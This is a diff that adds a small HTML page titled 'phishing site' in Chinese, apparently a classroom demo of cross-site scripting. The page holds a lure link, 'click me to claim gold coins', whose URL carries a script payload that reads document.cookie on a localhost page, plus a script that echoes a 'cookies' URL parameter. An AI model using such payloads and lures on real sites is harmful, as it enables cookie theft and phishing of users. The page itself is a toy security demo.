@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>钓鱼网站</title>
+</head>
+<script>
+    var url = new URL(location.href);
+    document.getElementById('targetCooies').innerText =url.searchParams.get('cookies');
+</script>
+<body>
+    <a href='http://localhost:8080/demo.html?default=<script>alert(document.cookie)</script>'>点击我领取金币</a>
+    <div id="targetCooies"></div>
+</body>
+</html>
